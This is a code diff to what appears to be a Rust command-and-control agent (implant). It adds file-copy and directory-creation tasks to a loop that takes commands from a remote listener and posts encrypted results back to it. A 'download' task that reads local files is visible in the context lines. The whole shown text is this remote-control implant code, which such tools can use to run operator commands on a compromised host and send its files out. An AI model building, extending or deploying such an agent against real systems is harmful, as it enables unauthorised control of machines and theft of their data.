@@ -1,7 +1,7 @@
 use reqwest::header::{HeaderMap, USER_AGENT};
 use std::{
     collections::HashMap,
-    fs::File,
+    fs::{self, File},
     io::{self, Error, ErrorKind, Read, Write},
     thread,
     time,
@@ -204,6 +204,35 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     }
                 }
             }
+            "cp" => {
+                let src = task_args[1].to_string();
+                let dest = task_args[2].to_string();
+
+                match fs::copy(src, dest) {
+                    Ok(_) => {
+                        post_task_result(
+                            "Copied successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
             "download" => {
                 match std::fs::File::open(task_args[1].as_str()) {
                     Ok(ref mut f) => {
@@ -294,6 +323,32 @@ pub async fn run(config: Config) -> Result<(), Error> {
 
                         post_task_result(
                             output.as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            listener_url.to_string(),
+                            headers.clone(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                            &client,
+                        ).await;
+                    }
+                }
+            }
+            "mkdir" => {
+                match fs::create_dir_all(task_args[1].as_str()) {
+                    Ok(_) => {
+                        post_task_result(
+                            "Directory created successfully.".as_bytes(),
                             agent_name.to_string(),
                             listener_url.to_string(),
                             headers.clone(),
